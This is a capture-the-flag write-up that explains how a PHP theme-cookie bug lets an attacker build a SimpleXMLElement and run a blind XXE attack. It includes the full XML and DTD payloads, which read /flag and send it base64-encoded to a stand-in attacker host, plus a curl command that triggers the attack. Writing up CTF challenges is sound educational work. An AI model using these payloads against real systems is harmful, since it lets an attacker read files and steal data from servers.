# blind

## Challenge

Hacking blind: http://35.207.108.241

Flag is at /flag

Difficulty estimate: Medium


## Solution

The given website shows the following PHP code:

```php
 <?php
  function __autoload($cls) {
    include $cls;
  }

  class Black {
    public function __construct($string, $default, $keyword, $store) {
      if ($string) ini_set("highlight.string", "#0d0d0d");
      if ($default) ini_set("highlight.default", "#0d0d0d");
      if ($keyword) ini_set("highlight.keyword", "#0d0d0d");

      if ($store) {
            setcookie('theme', "Black-".$string."-".$default."-".$keyword, 0, '/');
      }
    }
  }

  class Green {
    public function __construct($string, $default, $keyword, $store) {
      if ($string) ini_set("highlight.string", "#00fb00");
      if ($default) ini_set("highlight.default", "#00fb00");
      if ($keyword) ini_set("highlight.keyword", "#00fb00");

      if ($store) {
            setcookie('theme', "Green-".$string."-".$default."-".$keyword, 0, '/');
      }
    }
  }

  if ($_=@$_GET['theme']) {
    if (in_array($_, ["Black", "Green"])) {
      if (@class_exists($_)) {
        ($string = @$_GET['string']) || $string = false;
        ($default = @$_GET['default']) || $default = false;
        ($keyword = @$_GET['keyword']) || $keyword = false;

        new $_($string, $default, $keyword, @$_GET['store']);
      }
    }
  } else if ($_=@$_COOKIE['theme']) {
    $args = explode('-', $_);
    if (class_exists($args[0])) {
      new $args[0]($args[1], $args[2], $args[3], '');
    }
  } else if ($_=@$_GET['info']) {
    phpinfo();
  }

  highlight_file(__FILE__);
```

We've noticed a few suspicious things:

* Having easy access to `phpinfo()`
* Having defined an `__autoload` hook
* Using a not validated user cookie when loading a theme to instantiate a new object

With PHP 5 this would have been a really challenge, because the `__autoload` hook was triggered with `class_exists($cls)` even when the `$cls` argument wasn't a
valid PHP class name.
We would have been able to inject a class name like `/flag` which would have caused the `/flag` file to be included within the `__autoload` hook.

However, from `phpinfo()` we know that PHP 7 was used and therefore this approach was inelegible.

The second option we had was trying to *misuse* a class from the PHP default namespace.
In order to instantiate this class it must have constructor with a matching signature to the following call:

```php
new $args[0]($args[1], $args[2], $args[3], '');
```

where ...

* ... `$args[0]` is the class name
* ... `$args[1]` is the first argument
* ... `$args[2]` is the second argument
* ... `$args[3]` is the third argument
* ... an empty string is the fourth argument

The `$args` array is injectable via cookie like the following:

```
theme=args[0]-args[1]-args[2]-args[3]
```

After a little research we've discovered a suitable class: `SimpleXMLElement`.
This class is vulnerable to a XML External Entity (XXE) attack.

Thus, we can inject arbitrary XML to be executed during the constructor of `SimpleXMLElement`:

```xml
<?xml version="1.0" ?>
<!DOCTYPE blind [
<!ELEMENT blind ANY >
<!ENTITY % dtdata SYSTEM "http://our-malicious-host.tld/blind.dtd">
%dtdata;
%flagdata;
]>
<blind>&exfiltrate;</blind>
```

And the `blind.dtd`:

```xml
<!ENTITY % flag SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % flagdata "<!ENTITY exfiltrate SYSTEM 'http://our-malicious-host.tld/?%flag;'>">
```

For this attack we have to setup a web server at `our-malicious-host.tld` which hosts the XML and the DTD file.
In addition we can monitor the webservers access logs to see the exfiltrated flag (which is base64 encoded).

We can now simply `curl` to execute the attack:

```
curl -v --cookie 'theme=SimpleXMlElement-http://our-malicious-host.tld/blind.xml-2-true' 'http://35.207.108.241'
```
